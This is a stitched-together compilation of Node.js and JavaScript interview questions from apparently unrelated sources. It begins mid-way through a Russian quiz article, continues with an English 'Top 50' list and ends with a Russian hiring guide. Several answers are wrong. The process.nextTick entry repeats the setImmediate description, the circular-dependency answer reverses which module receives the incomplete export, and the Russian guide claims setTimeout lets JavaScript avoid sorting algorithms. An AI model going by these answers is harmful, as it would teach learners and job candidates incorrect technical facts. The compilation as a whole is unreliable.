Для того, чтобы понять сущность цикла событий, полезно знать о том, в какой среде он работает. Нужно понимать роль V8, знать об API Node, и о том, как работает очередь событий, код, связанный с которыми, выполняется в V8.

API Node — это функции, вроде setTimeout или fs.readFile. Они не являются частью JavaScript. Это — просто функции, доступ к которым даёт нам Node.

Цикл событий находится в центре всего этого (конечно, на самом деле, всё это устроено сложнее) и играет роль организатора. Когда стек вызовов V8 пуст, цикл событий может принять решение о том, что следует выполнять дальше.

Вопрос №3. Что будет делать Node, когда стек вызовов и очереди цикла событий окажутся пустыми?

Ответ прост: Node просто завершит работу.

Когда вы запускаете приложение, Node автоматически запускает цикл событий, а когда цикл событий простаивает, когда ему нечего делать, процесс завершает работу.

Для того, чтобы процесс Node не завершался, нужно поместить что-нибудь в очередь событий. Например, когда вы запускаете таймер или HTTP-сервер, вы сообщаете циклу событий о том, что ему нужно продолжать работу и следить за этими событиями.

Вопрос №4. Помимо движка V8 и библиотеки libuv, какие ещё внешние зависимости есть у Node?

Вот некоторые самостоятельные библиотеки, которые может использовать процесс Node:

http-parser
c-ares
OpenSSL
zlib

Все они, по отношению к Node, являются внешними. У них имеется собственный исходный код, их распространение регулируется отдельными лицензиями. Node просто их использует.

Об этом стоит помнить для того, чтобы знать, где именно выполняется код вашей программы. Если вы, например, занимаетесь сжатием данных, вы можете столкнуться с проблемой, которая произошла в недрах стека zlib. Возможно, причина — в ошибке библиотеки, поэтому не стоит валить всю вину на Node.

Вопрос №5. Можно ли запустить процесс Node без V8?

Это хитрый вопрос. Для запуска процесса Node нужен JS-движок, но V8 — это не единственный доступный движок. В качестве альтернативы можно воспользоваться Chakra.

Взгляните на этот Github-репозиторий для того, чтобы узнать подробности о проекте node-chakra.

Вопрос №6. В чём разница между module.exports и exports?

Для экспорта API модулей всегда можно пользоваться командой module.exports. Можно, за исключением одной ситуации, использовать и exports:

module.exports.g = ...  // Ok
exports.g = ...         // Ok
module.exports = ...    // Ok
exports = ...           // Совсем не Ok
Объяснить с

Почему?

Команда exports — это просто ссылка, псевдоним для конструкции module.exports. Когда вы пытаетесь записать что-нибудь непосредственно в exports, вы меняете ссылку, которая там хранится, как результат, при последующих обращениях к exports вы уже не работаете с тем, на что эта переменная ссылается в официальном API (а это — module.exports). Записав что-нибудь в exports, вы превращаете это ключевое слово в локальную переменную, находящуюся в области видимости модуля.

Вопрос №7. Почему в модулях переменные верхнего уровня не являются глобальными?

Предположим, у вас имеется модуль module1, в котором определена переменная верхнего уровня g:

// module1.js
var g = 42;
Объяснить с

Далее, есть ещё один модуль, module2, к которому подключают module1 и пытаются обратиться к переменной g, получая в ответ сообщение об ошибке g is not defined.

Почему? Ведь, если сделать то же самое в браузере, то, после подключения скриптов, к их глобальным переменным обращаться можно.

Каждый файл Node оборачивается в собственное немедленно вызываемое функциональное выражение (IIFE, Immediately Invoked Function Expression). Все переменные, объявленные в файле Node, оказываются внутри этого IIFE и снаружи не видны.

Вот вопрос, связанный с рассматриваемым вопросом: что будет выведено после запуска следующего файла Node, в котором имеется лишь одна строчка кода:

// script.js
console.log(arguments);
Объяснить с

Очевидно, в консоль попадут какие-то аргументы!


Вывод аргументов

Почему? Дело в том, что этот файл Node выполняет как функцию. Node оборачивает код в функцию и у этой функции имеется пять аргументов, которые и можно видеть на рисунке.

Вопрос №8. Объекты exports, require и module глобально доступны в каждом файле, но каждый файл имеет их собственные экземпляры. Как такое возможно?

Когда вам нужен объект require, вы просто вызывает его напрямую, так, как если бы он был глобальной переменной. Однако, если исследовать require в двух разных файлах, окажется, что перед нами — два разных объекта. Почему это так?

Всё дело — в уже знакомых нам IIFE:


Исследование особенностей работы Node

Как видите, IIFE передаёт коду следующие пять аргументов: exports, require, module, __filename, и __dirname.

Эти пять переменных кажутся глобальными при использовании их в Node, но они, на самом деле, являются обычными аргументами функции.

Вопрос №9. Что такое циклические зависимости модулей в Node?

Если у вас имеется модуль module1, который зависит от module2, а module2, в свою очередь, зависит от module1, что произойдёт? Будет выведено сообщение об ошибке?

// module1
require('./module2');

// module2
require('./module1');
Объяснить с

Никакого сообщения об ошибке не будет. Node позволяет подобное.

Итак, в module1 подключается module2, но так как в module2 подключается module1, а module1 пока не полностью готов, module1 просто получит неполную версию module2. Теперь вы об этом знаете.

Вопрос №10. Когда допустимо использовать синхронные методы для работы с файловой системой (вроде readFileSync)?

Каждый асинхронный метод объекта fs в Node имеет синхронную версию. Зачем пользоваться синхронными методами вместо асинхронных?

Иногда в синхронных методах нет ничего плохого. Например, они могут пригодиться на этапе инициализации, при загрузке сервера. Часто ими так и пользуются, когда всё, что делается после инициализации, зависит от загруженных на этапе инициализации данных. Вместо того, чтобы заниматься конструированием кода, основанного на коллбэках, в подобных ситуациях, когда выполняется единоразовая загрузка каких-либо данных, вполне приемлемы синхронные методы.

Однако, если вы пользуетесь синхронными методами внутри обработчиков неких событий, вроде коллбэка HTTP-сервера, отвечающего за обработку запросов, то это, без вариантов, совершенно неправильно. Делать так настоятельно не рекомендуется.

Итоги

Надеюсь, вы смогли ответить на все эти вопросы, или, по крайней мере, на некоторые из них.

Уважаемые читатели! Если бы вы оказались на конференции по JS, на месте автора этой статьи, какие вопросы по Node.js вы задали бы аудитории?

Top 50 Node.Js Interview Questions and Answers
Node JS
Rajesh Kumar
·
February 11, 2022
·
0 Comment
What is Node.js? Where can you use it?
Introduction to the Node.js reference architecture, Part 1: Overview | Red  Hat Developer
Node.Js
Node.js is an open-source, cross-platform JavaScript runtime environment and library to run web applications outside the client’s browser. It is used to create server-side web applications.

Node.js is perfect for data-intensive applications as it uses an asynchronous, event-driven model. You can use I/O intensive web applications like video streaming sites. You can also use it for developing: Real-time web applications, Network applications, General-purpose applications, and Distributed systems.

2. Why use Node.js?

Node.js makes building scalable network programs easy. Some of its advantages include:

It is generally fast
It rarely blocks
It offers a unified programming language and data type
Everything is asynchronous
It yields great concurrency

3. How does Node.js work?
A web server using Node.js typically has a workflow that is quite similar to the diagram illustrated below. Let’s explore this flow of operations in detail.

Clients send requests to the webserver to interact with the web application. Requests can be non-blocking or blocking:
Querying for data
Deleting data
Updating the data
Node.js retrieves the incoming requests and adds those to the Event Queue
The requests are then passed one-by-one through the Event Loop. It checks if the requests are simple enough not to require any external resources
The Event Loop processes simple requests (non-blocking operations), such as I/O Polling, and returns the responses to the corresponding clients.
A single thread from the Thread Pool is assigned to a single complex request. This thread is responsible for completing a particular blocking request by accessing external resources, such as computation, database, file system, etc.

Once the task is carried out completely, the response is sent to the Event Loop that sends that response back to the client.

3. Why is Node.js Single-threaded?

Node.js is single-threaded for async processing. By doing async processing on a single-thread under typical web loads, more performance and scalability can be achieved instead of the typical thread-based implementation.

4. If Node.js is single-threaded, then how does it handle concurrency?

The Multi-Threaded Request/Response Stateless Model is not followed by the Node JS Platform, and it adheres to the Single-Threaded Event Loop Model. The Node JS Processing paradigm is heavily influenced by the JavaScript Event-based model and the JavaScript callback system. As a result, Node.js can easily manage more concurrent client requests. The event loop is the processing model’s beating heart in Node.js.

5. Explain callback in Node.js?

A callback function is called after a given task. It allows other code to be run in the meantime and prevents any blocking. Being an asynchronous platform, Node.js heavily relies on callback. All APIs of Node are written to support callbacks.

6. What are the advantages of using promises instead of callbacks?

The control flow of asynchronous logic is more specified and structured.
The coupling is low.
We’ve built-in error handling.
Improved readability.

7. How would you define the term I/O?

The term I/O is used to describe any program, operation, or device that transfers data to or from a medium and to or from another medium.
Every transfer is an output from one medium and an input into another. The medium can be a physical device, network, or files within a system.
8. How is Node.js most frequently used?

Node.js is widely used in the following applications:

Real-time chats
Internet of Things
Complex SPAs (Single-Page Applications)
Real-time collaboration tools
Streaming applications
Microservices architecture
9. Explain the difference between frontend and backend development?

Front-end	Back-end
Frontend refers to the client-side of an application	Backend refers to the server-side of an application
It is the part of a web application that users can see and interact with	It constitutes everything that happens behind the scenes
It typically includes everything that attributes to the visual aspects of a web application	It generally includes a web server that communicates with a database to serve requests
HTML, CSS, JavaScript, AngularJS, and ReactJS are some of the essentials of frontend development	Java, PHP, Python, and Node.js are some of the backend development technologies
10. What is NPM?


NPM
NPM stands for Node Package Manager, responsible for managing all the packages and modules for Node.js

Node Package Manager provides two main functionalities:

Provides online repositories for node.js packages/modules, which are searchable on search.nodejs.org
Provides command-line utility to install Node.js packages and also manages Node.js versions and dependencies.
11. How do you manage packages in your node.js project?

It can be managed by a number of package installers and their configuration file accordingly. Out of them mostly use npm or yarn. Both provide almost all libraries of javascript with extended features of controlling environment-specific configurations. To maintain versions of libs being installed in a project we use package.json and package-lock.json so that there is no issue in porting that app to a different environment.

12. How is Node.js better than other frameworks most popularly used?

Node.js provides simplicity in development because of its non-blocking I/O and even-based model results in short response time and concurrent processing, unlike other frameworks where developers have to use thread management.
It runs on a chrome v8 engine which is written in c++ and is highly performant with constant improvement.
Also since we will use Javascript in both the frontend and backend the development will be much faster.
And at last, there are ample libraries so that we don’t need to reinvent the wheel.
13. Explain the steps how “Control Flow” controls the functions calls?

How “Control Flow” controls the functions calls? | Mocamboo.com
how control flow control the function calls
Control the order of execution
Collect data
Limit concurrency
Call the following step in the program
14. What are some commonly used timing features of Node.js?

setTimeout/clearTimeout – This is used to implement delays in code execution.
setInterval/clearInterval – This is used to run a code block multiple times.
setImmediate/clearImmediate – Any function passed as the setImmediate() argument is a callback that’s executed in the next iteration of the event loop.
process.nextTick – Any function passed as the setImmediate() argument is a callback that’s executed in the next iteration of the event loop.
15. What is fork in node JS?

A fork in general is used to spawn child processes. In node it is used to create a new instance of v8 engine to run multiple workers to execute the code.

16. How do you create a simple server in Node.js that returns Hello World?

__________________________________________

JavaScript
var http = require("http");
http.createServer(function (request, response) {
response.writeHead(200, {'Content-Type': 'text/plain'});
response.end('Hello World\n');
}).listen(3000);
Code language: JavaScript (javascript)
___________________________________________

17. How many types of API functions are there in Node.js?


API functions are available in Nodes.Js
There are two types of API functions:

Asynchronous, non-blocking functions – mostly I/O operations which can be fork out of the main loop.
Synchronous, blocking functions – mostly operations that influence the process running in the main loop.
18. What is REPL?

PL in Node.js stands for Read, Eval, Print, and Loop, which further means evaluating code on the go.

19. List down the two arguments that async.queue takes as input?

Task Function
Concurrency Value
20. What is the purpose of module.exports?

This is used to expose functions of a particular module or file to be used elsewhere in the project. This can be used to encapsulate all similar functions in a file which further improves the project structure.

For example, you have a file for all utils functions with util to get solutions in a different programming language of a problem statement.

_______________________________________________________

const getSolutionInJavaScript = async ({
problem_id
}) => {
…
};
const getSolutionInPython = async ({
problem_id
}) => {
…
};
module.exports = { getSolutionInJavaScript, getSolutionInPython }

___________________________________________________________

Thus using module.exports we can use these functions in some other file:

_____________________________________________________

JavaScript
const { getSolutionInJavaScript, getSolutionInPython} = require("./utils")
________________________________________

Code language: JavaScript (javascript)
21. What tools can be used to assure consistent code style?

ESLint can be used with any IDE to ensure a consistent coding style which further helps in maintaining the codebase.

22. What do you understand by callback hell?

______________________________________________

JavaScript
async_A(function(){
   async_B(function(){
       async_C(function(){
           async_D(function(){
           ....
           });
       });
   });
});
____________________________________
Code language: JavaScript (javascript)
For the above example, we are passing callback functions and it makes the code unreadable and not maintainable, thus we should change the async logic to avoid this.

23. If Node.js is single threaded then how does it handle concurrency?

The main loop is single-threaded and all async calls are managed by libuv library.

For example:

_________________________________________________

JavaScript
const crypto = require("crypto");
const start = Date.now();
function logHashTime() {
 crypto.pbkdf2("a", "b", 100000, 512, "sha512", () => {
console.log("Hash: ", Date.now() - start);
 });
}
logHashTime();
logHashTime();
logHashTime();
logHashTime();
_____________________________________
Code language: JavaScript (javascript)
This gives the output:

_______________________________________

Hash: 1213
Hash: 1225
Hash: 1212
Hash: 1222
_________________________________
This is because libuv sets up a thread pool to handle such concurrency. How many threads will be there in the thread pool depends upon the number of cores but you can override this.

24. How does Node.js overcome the problem of blocking of I/O operations?

Since the node has an event loop that can be used to handle all the I/O operations in an asynchronous manner without blocking the main function.

So for example, if some network call needs to happen it will be scheduled in the event loop instead of the main thread(single thread). And if there are multiple such I/O calls each one will be queued accordingly to be executed separately(other than the main thread).

Thus even though we have single-threaded JS, I/O ops are handled in a nonblocking way.

25. How can we use async await in node.js?

Here is an example of using async-await pattern:

_________________________________________________________

JavaScript
// this code is to retry with exponential backoff
function wait (timeout) {
 return new Promise((resolve) => {
setTimeout(() => {
  resolve()
}, timeout);
 });
}
async function requestWithRetry (url) {
 const MAX_RETRIES = 10;
 for (let i = 0; i <= MAX_RETRIES; i++) {
try {
  return await request(url);
} catch (err) {
  const timeout = Math.pow(2, i);
  console.log('Waiting', timeout, 'ms');
  await wait(timeout);
  console.log('Retrying', err.message, i);
}
 }
}
_______________________________________________
Code language: JavaScript (javascript)
26. What are node.js buffers?

In general, buffers is a temporary memory that is mainly used by stream to hold on to some data until consumed. Buffers are introduced with additional use cases than JavaScript’s Unit8Array and are mainly used to represent a fixed-length sequence of bytes. This also supports legacy encodings like ASCII, utf-8, etc. It is a fixed(non-resizable) allocated memory outside the v8.

27. Describe the exit codes of Node.js?

Exit codes give us an idea of how a process got terminated/the reason behind termination.

A few of them are:

Uncaught fatal exception – (code – 1) – There has been an exception that is not handled
Unused – (code – 2) – This is reserved by bash
Fatal Error – (code – 5) – There has been an error in V8 with stderr output of the description
Internal Exception handler Run-time failure – (code – 7) – There has been an exception when bootstrapping function was called
Internal JavaScript Evaluation Failure – (code – 4) – There has been an exception when the bootstrapping process failed to return function value when evaluated.
28. What is a thread pool and which library handles it in Node.js?

The Thread pool is handled by the libuv library. libuv is a multi-platform C library that provides support for asynchronous I/O-based operations such as file systems, networking, and concurrency.

29. Differentiate between JavaScript and Node.js.?

Features	JavaScript	Node.Js
Type	Programming language	Interpreter and environment for JavaScript
Utility	Used for any client-side activity for a web application	Used for accessing or performing any non-blocking operation of any operating system
Running Engine	Spider monkey (FireFox), JavaScript Core (Safari), V8 (Google Chrome), etc	V8 (Google Chrome)
30. What is the difference between Angular and Node.js?

Angular	Node.Js
It is an open source web application development framework	It is a cross-platform run-time environment for applications
It is written in TypeScript	It is written in C, C++ and JavaScript languages
Used for building single-page client-side web applications	Used for building fast and scalable server-side networking applications
Angular itself is a web application framework	Node.js has many different frameworks like Sails.js, Partial.js, and Express.js, etc.
Ideal for creating highly active and interactive web apps	Ideal for developing small size projects
Helpful in splitting an app into MVC components	Helpful in generating database queries
Suitable for developing real-time applications	Suitable in situations where something faster and more scalable is required
31. How do Node.js works?

Node.js is a virtual machine that uses JavaScript as its scripting language and runs on a v8 environment. It works on a single-threaded event loop and a non-blocking I/O which provides high rate as it can handle a higher number of concurrent requests. Also, by making use of the ‘HTTP’ module, Node.js can run on any stand-alone web server.

32. Where Node.js can be used?

Node.js can be used to develop:

Real-Time Web Applications
Network Applications
Distributed Systems
General Purpose Applications
33. What do you understand by Event-driven programming?

PPT - Event-Driven Programming PowerPoint Presentation, free download -  ID:5316579
Event-driven programming is an approach that heavily makes use of events for triggering various functions. An event can be anything like a mouse click, key press, etc. When an event occurs, a call back function is executed that is already registered with the element. This approach mainly follows the publish-subscribe pattern. Because of event-driven programming, Node.js is faster when compared to other technologies.

34. Explain REPL in the context of Node.js.?

REPL in Node.js stands for Read, Eval, Print, and Loop. It represents a computer environment such as a window console or Unix/Linux shell where any command can be entered and then the system can respond with an output. Node.js comes bundled with a REPL environment by default. REPL can perform the below-listed tasks:

Read: Reads the user’s input, parses it into JavaScript data-structure and then stores it in the memory.
Eval: Receives and evaluates the data structure.
Print: Prints the final result.
Loop: Loops the provided command until CTRL+C is pressed twice.

35. List down the steps using which “Control Flow” controls the function calls in Node.js?

Control the order of execution
Collect data
Limit concurrency
Call the next step in the program
Want to upskill yourself to get ahead in your career? Check out this video

36. What is an error-first callback in Node.js?

Error-first callbacks in Node.js are used to pass errors and data. The very first parameter you need to pass to these functions has to be an error object while the other parameters represent the associated data. Thus you can pass the error object for checking if anything is wrong and handle it. In case there is no issue, you can just go ahead and with the subsequent arguments.

_________________________________________________

JavaScript
 var myPost = new Post({title: 'edureka'});
 myPost.save(function(err,myInstance){
 if(err){
 //handle error and return
}
//go ahead with `myInstance`
});
______________________________________
Code language: JavaScript (javascript)
37. What do you understand by Reactor Pattern in Node.js?

Reactor Pattern in Node.js is basically a concept of non-blocking I/O operations. This pattern provides a handler that is associated with each I/O operation and as soon as an I/O request is generated, it is then submitted to a demultiplexer. This demultiplexer is a notification interface which is capable of handling concurrency in non-blocking I/O mode. It also helps in collecting each and every request in the form of an event and then place each event in a queue. Thus resulting in the generation of the Event Queue. Simultaneously, we have our event loop which iterates the events present in the Event Queue.

38. What are LTS releases of Node.js?

LTS stands Long Term Support version of Node.js that receives all the critical bug fixes along with security updates and performance improvements. These versions are supported for at least 18 months and mainly focus on stability and security. The modifications done to the LTS versions are restricted to the bug fixes, security upgrade, npm, and documentation updates, performance improvement, etc.

39. List down the major security implementations within Node.js?

Major security implementations in Node.js are:

Authentications
Error Handling
40. Explain the concept of middleware in Node.js?

In general, middleware is a function receives the Request and Response objects. In other words, in an application’s request-response cycle these functions have access to various request & response objects along with the next function of the cycle. The next function of middleware is represented with the help of a variable, usually named next. Most commonly performed tasks by the middleware functions are:

Execute any type of code
Update or modify the request and the response objects
Finish the request-response cycle
Invoke the next middleware in the stack
41. What do you understand by ESLint?

ESLint is an open source project initially developed by Nicholas C. Zakas in 2013 which aims to provide a linting utility for JavaScript through a plug. Linters in Node.js are good tools for searching certain bug classes, especially those which are related to the variable scope.

42. For Node.js, why Google uses V8 engine?

Google uses V8 as it is a Chrome runtime engine that converts JavaScript code into native machine code. This, in turn, speeds up the application execution and response process and give you a fast running application.

43. Differentiate between spawn() and fork() methods in Node.js?

In Node.js, the spawn() is used to launch a new process with the provided set of commands. This method doesn’t create a new V8 instance and just one copy of the node module is active on the processor. When your child process returns a large amount of data to the Node you can invoke this method.

Syntax:

__________________________________________________________

CSS
child_process.spawn(command[, args][, options])
____________________________________________
Code language: CSS (css)
Whereas, the fork() in Node.js is a special instance of spawn() that executes a new instance of the V8 engine. This method simply means that multiple workers are running on a single Node code base for various task.

Syntax:

_______________________________________________________________

CSS
child_process.fork(modulePath[, args][, options])
________________________________________________
Code language: CSS (css)
In case you are facing any challenges with these Node.js Interview Questions, please mention your problems in the section comment section below.

44. What do you understand by global objects in Node.js?

In Node.js, Globals are the objects which are global in nature and are available in all the modules of the application. You can use these objects directly in your application, rather than having to include them explicitly. The global objects can be modules, functions, strings, object, etc. Moreover, some of these objects can be in the module scope instead of global scope.

45. How assert works in Node.js?

In Node.js, assert is used to write tests. It only provides feedback only when any of the running test cases fails. This module gives you a set of assertion tests which are then used for testing invariants. It is basically used internally by Node.js but using require(‘assert’) code, it can be used in other applications as well.

___________________________________________________________

JavaScript
var assert = require('assert');
function mul(a, b) {
return a * b;
}
var result = mul(1,2);
assert( result === 2, 'one multiplied by two is two');
______________________________________________
Code language: JavaScript (javascript)
46. Explain the usage of a buffer class in Node.js?

Buffer class in Node.js is used for storing the raw data in a similar manner of an array of integers. But it corresponds to a raw memory allocation that is located outside the V8 heap. It is a global class that is easily accessible can be accessed in an application without importing a buffer module. Buffer class is used because pure JavaScript is not compatible with binary data. So, when dealing with TCP streams or the file system, it’s necessary to handle octet streams.

47. Differentiate between readFile vs createReadStream in Node.js?

Node.js provides two ways to read and execute files which are using readFile and CreateStream. readFile() is a fully buffered process which returns the response only when the complete file is pushed into the buffer and is read. It is a memory intensive process and in case of large files, the processing can be very slow. Whereas createReadStream is a partially buffered which treats the entire process as an event series. The entire file is split into chunks which are then processed and sent back as a response one by one. Once done, they are finally removed from the buffer. Unlike readFile, createReadStream is really effective for the processing of the large files.

48. Explain the concept of Punycode in Node.js?

In Node.js, Punycode is an encoding syntax that is used for converting Unicode (UTF-8) string of characters into a basic ASCII string of characters. It is important as the hostnames can only understand the ASCII characters. Thus, Node.js version 0.6.2 onwards, it was bundled up with the default Node package. If you want to use it with any previous versions, you can easily do that by using the following code:

Syntax:

____________________________________

JavaScript
punycode = require('punycode');
___________________________
Code language: JavaScript (javascript)
49. Does Node.js provide any Debugger?

Node.js do provide a simple TCP based protocol and debugging client that comes built-in. In order to debug your JavaScript file, you can use the below debug argument followed by js file name that you want to debug.

Syntax:

________________________________________________________________________________________

XML
node debug [script.js | -e "script" | &lt;host&gt; : &lt;port&gt; ]
___________________________________________________________________
Code language: HTML, XML (xml)
In case you are facing any challenges with these Node.js Interview Questions, please mention your problems in the section comment section below.

50. Does node run on windows?

Yes – it does.

Подбор Node js
Согласно статистике, Node.js повышает производительность на 50% и снижает затраты на разработку на 58%. Более 28 000 веб-сайтов в США используют эту платформу, включая такие известные сервисы, как Paypal, Netflix, LinkedIn, Reddit, Medium, eBay и другие.

Нет никаких сомнений в том, что Node.js это отличный выбор. Чтобы создать свое решение с использованием этой технологии, вам нужна сильная команда. Если вы являетесь владельцем продукта, не обладающим техническими знаниями или обладаете ограниченными знаниями об этой структуре, вы можете столкнуться с трудностями при поиске подходящих разработчиков.

В этой статье мы приводим список вопросов и ответов для Node.js собеседования, которые помогут вам оценить технические знания ваших кандидатов. Продолжайте читать, чтобы узнать больше.

Подготовка к собеседованию:

Прежде чем перейти к списку вопросов, давайте проясним ключевые моменты, которые необходимо учитывать во время собеседования. Прежде всего, важно ознакомиться с биографией вашего потенциального сотрудника. Мы предлагаем использовать вопросы для интервью с разработчиком программного обеспечения, которые идеально подходят для обсуждения общих терминов информатики.

Когда дело доходит до Node.js задавайте вопросы для интервью, придерживайтесь тем высокого уровня. Вы не можете быть уверены, что выбрали правильного специалиста строго по вопросам собеседования, но вы можете оценить их технические способности. Помните, что код — это не единственная часть собеседования. Вам также необходимо определить, будет ли с кандидатом легко или трудно работать.

13 Лучших вопросов и ответов для интервью на JavaScript:

Как упоминалось ранее, Node.js это фреймворк, который в основном работает на JavaScript. Итак, если вы хотите отобрать лучших специалистов, вам следует начать с оценки их навыков программирования на JavaScript. Для этой цели используйте следующий список вопросов для интервью JS. Подробнее о собеседовании по JavaScript вы можете прочитать в статье.

Назовите и сравните различные парадигмы программирования. К какому из них относится JavaScript?
Парадигма программирования — это набор идей и концепций для языков программирования. Существует две основные парадигмы: объектно-ориентированное программирование (ООП) и функциональное программирование (ФП).

ООП основано на идее представления всего в виде объектов с некоторыми свойствами. Эти функции, в свою очередь, могут выполнять действия, методы и функции. FP оперирует процессами и функциями, а не объектами. Это описывает их.

JavaScript не является ни чисто объектно-ориентированным, ни чисто функциональным. Это процедурный язык, который группирует инструкции в процедуры. Он имеет поддержку ООП в виде прототипов.

Каковы элементы функционального программирования в JavaScript?
Существует множество элементов, но наиболее важными из них являются map, reduce, функции первого класса и функции более высокого порядка.

Какие сильные и слабые стороны у JavaScript? Приятно слышать от кандидата следующие преимущества: он легко изучаем и используется, поддерживает наследование прототипов, функциональное программирование и позволяет писать код как для бэкенда, так и для фронтенда (но не настолько мощно, как в Node.js).
Хотя JavaScript позволяет разработчикам создавать приложения с интерактивной функциональностью, в нем есть недостатки. Отсутствуют стандартные библиотеки, интерфейсы к веб-серверам и базам данных. Также отсутствуют встроенные системы управления пакетами.

Какой вид наследования используется в JavaScript? В JavaScript используется прототипное наследование, которое более просто и гибко по сравнению с наследованием на основе классов. Прототипное наследование реализуется с использованием объектов. Каждый объект имеет внутреннюю ссылку на другой объект, который является его прототипом. Если объект B является прототипом объекта A, то каждый раз, когда B имеет свойство, такое как цвет, A унаследует то же самое свойство, если не указано иное. A может быть унаследован от B, и B, в свою очередь, может быть унаследован от C. Это называется цепочкой прототипов.
Какие виды структур данных используются в JavaScript? JavaScript имеет два типа данных: примитивные и объекты. Примитивные типы не являются объектами и не имеют собственных методов. Все примитивные значения неизменяемы. Они включают логические значения, ноль, неопределенное значение, числа, строки и символы.
Непримитивные структуры данных определяются программистом, а не языком программирования. Эти значения изменяемы и включают в себя функции, массивы и динамические структуры данных, такие как очереди и связанные списки.

Что такое функтор? Функтор относится к функциональному программированию и может интерпретироваться по-разному на различных языках.
Функтор — это набор элементов, которые можно отобразить и получить нужное значение, оставаясь в одной и той же структуре (массив — один из популярных функторов).

Мы можем установить определенное значение для каждого элемента и затем извлечь из него что-то (вызвав функцию). После этого все данные возвращаются в контейнер и сохраняют прежнюю структуру и вид. Для выполнения этой функции в JavaScript используется метод .map(f).

Расскажите о методах сортировки. При работе с большими массивами, что является обыденным делом в JavaScript, необходимо использовать различные методы сортировки данных. Среди популярных алгоритмов сортировки можно выделить пузырьковую сортировку, сортировку шейкером, гребенчатую сортировку, сортировку вставками и сортировку ракушкой. Попросите кандидата описать механизмы некоторых из них.
Можно ли назвать JavaScript асинхронным языком? Понимание разницы между асинхронным программированием — один из ключевых моментов на собеседовании. Да, JavaScript асинхронный. Это означает, что события происходят параллельно или одно за другим. В JavaScript асинхронная природа помогает легко сортировать массивы. Например, есть функция setTimeout, которая позволяет избегать использования алгоритмов сортировки.
Можно ли назвать JavaScript многопоточным языком? Нет, JavaScript не является многопоточным языком, так как у него есть только один стек вызовов и одна куча памяти, и он всегда работает в одном потоке.
 

Что такое каррирование (Currying)? Когда его используют? Каррирование — это техника преобразования функции с несколькими аргументами в последовательность функций с одним аргументом. Сначала функция принимает один аргумент и возвращает новую функцию, которая принимает следующий аргумент и так далее. Этот процесс продолжается до тех пор, пока не будут переданы все аргументы, и функция выполняет свою основную задачу.
Каррирование особенно полезно в ситуациях, когда у вас есть функция с множеством аргументов, и вы хотите предоставить возможность частичной применения аргументов или создания новых функций на основе существующей. Это может быть полезно для создания обобщенных функций или улучшения читаемости кода.

15 Основных Вопросов и Ответов на Собеседовании по Node.js:

После освоения основ JavaScript перейдем к самому важному разделу — вопросам для собеседования по Node.js. Если вы стремитесь привлечь топовых специалистов, уделите внимание следующим вопросам:

Что такое Node.js?
Node.js — это не язык программирования, а кросс-платформенный фреймворк с открытым исходным кодом. Он был создан в 2009 году Райаном Далом и расширил применение JavaScript на серверную сторону. Это позволяет использовать JavaScript для создания высокопроизводительных веб-приложений и других приложений.

Какие типы приложений можно создавать с помощью Node.js?
Node.js позволяет создавать разнообразные типы приложений, благодаря расширению возможностей JavaScript. Это включает в себя серверные веб-приложения, приложения для реального времени, игры, платформы электронной коммерции, системы управления контентом, API и многое другое.

Какие преимущества Node.js перед другими фреймворками?
Node.js имеет множество преимуществ, включая:

Возможность создания интерактивных приложений и приложений реального времени.
Быструю синхронизацию событий для многопользовательских функций.
Возможность разрабатывать весь стек приложения на одном языке (JavaScript).
Большое сообщество и поддержка от организаций, таких как Medium и Uber.
Что такое цикл событий (Event Loop)?
Цикл событий (Event Loop) — это ключевой механизм, который делает JavaScript быстрым и поддерживает асинхронное программирование. Он отслеживает выполнение задач в стеке вызовов (Call Stack) и обработку событий в очереди обратных вызовов (Callback Queue). Если стек вызовов пуст, цикл событий берет событие из очереди и выполняет его.

Цикл событий особенно полезен для обработки асинхронных операций, таких как ввод-вывод и сетевые запросы.

Что такое V8? Как это работает? V8 — это среда выполнения с открытым исходным кодом, созданная Google, которая компилирует и выполняет JavaScript. Она была разработана с целью повысить производительность выполнения JavaScript. V8 компилирует JavaScript-код в машинный код, что делает выполнение JavaScript в Node.js быстрым и эффективным.
Что такое сборка мусора (Garbage Collection)? Сборка мусора в JavaScript — это механизм автоматического управления памятью, который удаляет объекты, на которые больше не ссылаются другие объекты, чтобы освободить память. Сборка мусора позволяет избежать утечек памяти и эффективно использовать ресурсы. В JavaScript, объекты удаляются сборщиком мусора, когда на них больше нет ссылок.
В чем разница между потоком Duplex и потоком Transform? Потоки Duplex и Transform — это два разных типа потоков в Node.js.
Дуплексные потоки (Duplex streams) представляют собой потоки, которые могут одновременно принимать и отправлять данные. Они могут быть реализованы с помощью методов _write и _read. Дуплексные потоки подходят, например, для создания двусторонних сетевых соединений через соксеты TCP.

Потоки Transform (Transform streams) также могут одновременно принимать и отправлять данные, но они используют метод _transform для обработки данных. Это позволяет им выполнять преобразования данных в процессе их передачи. Потоки Transform полезны, например, для сжатия и хеширования данных в реальном времени.

Опишите механизм NPM (Node Package Manager). NPM (Node Package Manager) — это система управления пакетами, встроенная в Node.js. Она позволяет разработчикам управлять зависимостями и публиковать свои пакеты кода для использования другими разработчиками. В NPM есть более 60 000 модулей и 475 000 пакетов кода, которые могут быть легко установлены и использованы. Это упрощает разработку, обновление и совместное использование кода.
Какие существуют способы масштабирования приложения Node.js? Существует несколько стратегий масштабирования приложений Node.js:
Клонирование приложения: приложение может быть клонировано несколько раз с использованием балансировщика нагрузки, чтобы распределить нагрузку между клонами.
Декомпозиция: приложение может быть разделено на различные компоненты с различной функциональностью, которые могут быть развернуты и масштабированы независимо.
Разделение: приложение может быть разделено на множество меньших частей, каждая из которых может быть развернута и масштабирована по отдельности.
Выбор стратегии зависит от конкретных требований и характеристик приложения.

Сравните SetTimeout, Process.NextTick и SetImmediate. SetTimeout, Process.NextTick и SetImmediate — это три разных функции в Node.js, которые позволяют планировать выполнение кода в разных контекстах.
SetTimeout используется для установки задержки перед выполнением функции. Он полезен, когда необходимо выполнить что-то через определенное время после текущего цикла событий.
Process.NextTick используется для выполнения функции в текущем цикле событий, до выполнения других задач в очереди. Это позволяет выполнить код немедленно в текущем контексте.
SetImmediate используется для выполнения функции на следующей итерации цикла событий, после завершения текущего цикла. Это полезно, когда нужно выполнить что-то на следующем шаге событийного цикла.
Пример использования:

javascriptCopy code

setTimeout(() => { console.info(‘Выполнение через задержку’); }, 1000); setImmediate(() => { console.info(‘Выполнение на следующей итерации цикла’); }); process.nextTick(() => { console.info(‘Выполнение в текущем цикле событий’); }); console.info(‘Завершение главного модуля’);

Что такое глобальные объекты? Глобальные объекты в JavaScript выполняют различные функции и могут быть доступны и изменяемы в любом месте кода без необходимости их явного импорта или создания. Эти объекты уже предопределены в среде выполнения JavaScript.
